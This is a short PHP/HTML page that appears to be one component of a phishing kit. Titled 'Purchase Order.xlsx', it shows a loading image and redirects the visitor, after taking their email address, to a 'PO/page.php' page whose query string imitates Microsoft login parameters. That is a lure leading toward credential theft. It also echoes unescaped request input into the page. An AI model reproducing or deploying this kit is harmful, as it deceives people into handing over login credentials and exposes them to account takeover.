<?php


$user = $_REQUEST['email'];
$email = base64_encode($user);
echo "<meta http-equiv=refresh content=3;url='PO/page.php?email=$email&.rand=13vqcr8bp0gud&lc=1033&id=64855&mkt=en-us&cbcxt=mai&snsc=1' >";


?>

<html>

<head>
<title> Purchase Order.xlsx </title>
</head>

<body style="background-image: url('lintex.png'); background-repeat: no-repeat">


<div style="position: absolute; width: 437px; height: 278px; z-index: 1; left: 422px; top: 223px; id="layer1">
<img src="loading.gif">
</div>

</body>
</html>
